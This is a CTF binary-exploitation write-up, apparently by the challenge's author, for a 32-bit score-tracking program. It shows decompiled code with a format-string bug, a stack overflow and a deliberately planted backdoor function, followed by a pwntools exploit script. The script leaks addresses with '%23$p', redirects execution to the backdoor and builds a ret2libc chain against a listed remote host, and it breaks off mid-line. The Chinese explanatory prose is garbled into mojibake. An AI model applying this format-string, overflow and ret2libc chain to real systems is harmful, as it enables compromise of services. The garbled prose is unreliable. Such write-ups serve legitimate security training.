class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.3</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.300000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">1</span><br><span class="line">Please enter the exact number of songs you want to query:11.2</span><br><span class="line"></span><br><span class="line">Please enter your score for this spectrum:10000000</span><br><span class="line"></span><br><span class="line">The single PTT is 13.200000, you still need to keep working hard. Even if you PM, it&#x27;s the same. You can&#x27;t be proud anymore</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">3</span><br><span class="line">Your PTT is13.333333</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">6</span><br><span class="line">rating = 13.200000,music = 11.200000</span><br><span class="line">rating = 13.300000,music = 11.300000</span><br><span class="line">rating = 13.500000,music = 11.500000</span><br></pre></td></tr></table></figure><p>â€‹ä¼¼ä¹æ²¡å•¥é—®é¢˜ã€‚å†çœ‹çœ‹ 4ã€5 ä¸¤ä¸ªåŠŸèƒ½ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">4</span><br><span class="line">You can vote for what you like. You can input the name of your favorite song and cast your valuable vote</span><br><span class="line">You can  vote 3 times, you can vote other songs, and you can&#x27;t vote for the same song again. There won&#x27;t be any problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)testify</span><br><span class="line">Your vote was for testify</span><br><span class="line">. Thank you for your affirmation of this spectrum, and I hope you can score smoothly</span><br><span class="line">=======Please select the following options to use the relevant functions========</span><br><span class="line">1. If the score is qualified, it will be stored in B30</span><br><span class="line">2. Calculate single PTT</span><br><span class="line">3. Calculate player PTT through b30</span><br><span class="line">4. Give your favorite song a vote</span><br><span class="line">5. View voted songs</span><br><span class="line">6. Output all content of b30</span><br><span class="line">7. Exit the system</span><br><span class="line">5</span><br><span class="line">The name of the song you voted for is:</span><br><span class="line">testify</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œï¼Œæ€»çš„èƒ½è¾“å…¥å­—ç¬¦çš„æ„Ÿè§‰åªæœ‰ 4ï¼Œå…¶ä»–çš„åªæœ‰æ•°å­—ã€‚</p><p>â€‹ä¸Š IDAï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> <span class="type">double</span> v3; <span class="comment">// fst7</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-Ah] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-6h] [ebp-1Ch]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [esp+0h] [ebp-16h] BYREF</span></span><br><span class="line">  __int16 *v8; <span class="comment">// [esp+2h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// [esp+6h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+Ah] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+Eh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(<span class="number">0xC</span>u);</span><br><span class="line">  init();</span><br><span class="line">  hello();</span><br><span class="line">  *((_DWORD *)v9 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%f&quot;</span>, &amp;v8, v5, v6);</span><br><span class="line">  compare(*(<span class="type">float</span> *)&amp;v8);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=======Please select the following options to use the relevant functions========&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. If the score is qualified, it will be stored in B30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Calculate single PTT&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Calculate player PTT through b30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Give your favorite song a vote&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. View voted songs&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;6. Output all content of b30&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;7. Exit the system&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    v8 = &amp;v7;</span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(<span class="type">const</span> <span class="type">char</span> *))__isoc99_scanf)(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        setB30(v9);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        calculateMusic(v9, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3 = pttCalculate(v9);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your PTT is%f\n&quot;</span>, (<span class="type">double</span>)v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        vote();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        output_vote(p_argc);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        test(v9);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        v10 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v10 != <span class="number">1</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Exit the program&quot;</span>);</span><br><span class="line">  freeNode(v9);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Exit successful&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you for using this scoring system&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;See you&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ‰¾äº†ä¸€åœˆï¼Œæœ€ååœ¨ output_vote å‡½æ•°é‡Œæ‰¾åˆ°äº†ä¸€ä¸ª printf (dest)ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">output_vote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !votes )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t voted yet\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The name of the song you voted for is:&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå¯ä»¥ç”¨æ¥æ³„éœ² main çš„åœ°å€ï¼Œç»•è¿‡ PIEï¼Œå…³é”®æ˜¯ strcpyï¼Œå­˜åœ¨ name è¿™ä¸ªå˜é‡ï¼Œä½†æ˜¯ä¸Šé¢æ²¡å®šä¹‰ï¼Œå› ä¸ºåœ¨ bss æ®µä¸Šï¼Œæ ¹æ®è¿™ä¸ªå˜é‡ï¼Œçœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†å®ƒï¼Œæœ€ååœ¨ vote é‡Œè°ƒç”¨äº†ä¸¤æ¬¡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( votes &gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have already cast 3 times, you cannot cast anymore&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;If you still want to vote, I suggest restarting this system, as it doesn&#x27;t have a memory function anyway &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can vote for what you like. You can input the name of your favorite song and cast your valuable vote&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;You can  vote 3 times, you can vote other songs, and you can&#x27;t vote for the same song again. There won&#x27;t be any pr&quot;</span></span><br><span class="line">      <span class="string">&quot;oblems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;name, <span class="number">0x60</span>u);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;Your vote was for %s. Thank you for your affirmation of this spectrum, and I hope you can score smoothly\n&quot;</span>,</span><br><span class="line">      &amp;name);</span><br><span class="line">    <span class="keyword">return</span> ++votes;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæœ‰ä¸ª readï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;name, <span class="number">0x60</span>u);</span><br></pre></td></tr></table></figure><p>â€‹å›å»ä¸€ä¸‹ï¼Œoutput_vote å‡½æ•°ä¸­ï¼Œå°† name å˜é‡å¡è¿›äº† dest é‡Œï¼Œä½† dest ä¼¼ä¹ä¸å¤Ÿå¤§ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œä½† gdb è°ƒä¸€ä¸‹ä¹‹åï¼Œå‘ç°å…¶å®é•¿åº¦ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œä¸å¤Ÿ ROPï¼ˆå¯èƒ½ç¨å¾®å¤§äº†ï¼Œä¸è¿‡æ‡’å¾—æ”¹äº†ï¼‰ï¼Œè¿™é‡Œå°±å¯ä»¥æ‰“æ ˆè¿ç§»äº†ï¼Œéšæ„ï¼Œä¸è¿‡ï¼Œé¢„æœŸè§£æ˜¯ libcï¼Œå¸¸è§„ libcï¼Œå› ä¸ºå¤šæ‰¾æ‰¾ï¼Œèƒ½æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">evaluate</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-8h] [ebp-150h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-4h] [ebp-14Ch]</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+Ch] [ebp-13Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">52</span>]; <span class="comment">// [esp+110h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You cannot call this function unless you have authorization&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So?How are you?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(buf, <span class="string">&quot;g01den&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO,you can&#x27;t do it&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK,Only I can give myself advice&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;plz input the count of your advice&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes, v1, v2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">256</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No ,don&#x27;t hack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, v4, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå‡½æ•°æ˜¯æˆ‘é¢„ç•™çš„ä¸€ä¸ªåé—¨ç®—æ˜¯åé—¨å§ï¼Œæƒ³åŠæ³•åŠ«æŒæ•°æ®æµè¿‡æ¥å§ï¼Œä¸è¿‡å¾—å…ˆæ³„éœ² mainã€‚</p><p>â€‹main çš„æŸä¸ªåç§»æ˜¯ <code>%23$p</code> ï¼Œè¿™é‡Œæ³„éœ²å‡ºæ¥çš„æ˜¯è¿™ä¸ªåœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000146A                 call    output_vote     ; jumptable 00001414 case 5</span><br><span class="line">.text:0000146F                 jmp     short _L3       ; jumptable 00001414 default case, case 0</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åçœŸå®åœ°å€å‡å»åç§»å¾—åˆ°äº† elf çš„åŸºåœ°å€ï¼Œä¹‹åå°±å¯ä»¥æ‹¿åˆ° evaluate çš„åœ°å€å’Œå…¶ä»– plt å’Œ got è¡¨çš„åœ°å€ï¼Œä¹‹åå°±å¸¸è§„çš„ libc3 äº†ã€‚æ³„éœ² puts çœŸå®åœ°å€ï¼Œç„¶åè·å¾— libc_base åœ°å€ï¼Œä¹‹åæ‹¿ binsh å’Œ systemã€‚</p><p>â€‹expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">Locale = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> Locale == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;154.64.254.169&quot;</span>,<span class="number">33185</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;11.0&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;AAAAAAAA%23$p&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">    main_146F = io.recv(<span class="number">10</span>)</span><br><span class="line">    main_addr = <span class="built_in">hex</span>(<span class="built_in">int</span>(main_146F,<span class="number">16</span>) - <span class="number">456</span>)</span><br><span class="line">    log.success(<span class="string">&quot;main_146F = &quot;</span> + <span class="built_in">str</span>(main_146F.decode()))</span><br><span class="line">    log.success(<span class="string">&quot;main_addr = &quot;</span> + <span class="built_in">str</span>(main_addr))</span><br><span class="line">    </span><br><span class="line">    offset = <span class="number">0x4c</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    main_addr = <span class="built_in">int</span>(main_addr,<span class="number">16</span>)</span><br><span class="line">    backdoor = main_addr + <span class="number">0x1DDE</span> - <span class="number">0x12A7</span></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * offset + p32(backdoor)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;So?How are you?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;g01den\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;plz input the count of your advice\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    base = main_addr - elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">    puts_plt = base + elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    puts_got = base + elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;main_add = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(main_addr)))</span><br><span class="line">    log.success(<span class="string">&quot;puts_plt = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">    log.success(<span class="string">&quot;elf_base = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(base)))</span><br><span class="line">    log.success(<span class="string">&quot;puts_got = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_got)))</span><br><span class="line">    </span><br><span class="line">    offset = <span class="number">0x13c</span></span><br><span class="line">    ret = base + <span class="number">0x100e</span></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    global_offset_table_addr = base + <span class="number">0x5000</span><span class="comment">#0x4fa0</span></span><br><span class="line">    log.success(<span class="string">&quot;global_offset_table_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(global_offset_table_addr)))</span><br><span class="line">    payload1 = (offset -<span class="number">8</span>) * <span class="string">b&quot;a&quot;</span> + p32(global_offset_table_addr) + p32(global_offset_table_addr) + p32(ret) + p32(puts_plt) + p32(backdoor) + p32(puts_got)</span><br><span class="line">    <span class="comment"># payload1 = offset * b&quot;a&quot; + p32(ret) + p32(main_addr)</span></span><br><span class="line">    <span class="comment"># payload1 = offset * b&quot;a&quot; + p32(ret) + p32(main_addr) </span></span><br><span class="line">    io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">    puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    log.success(<span class="string">&quot;puts_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc_base = &quot;</span> + <span 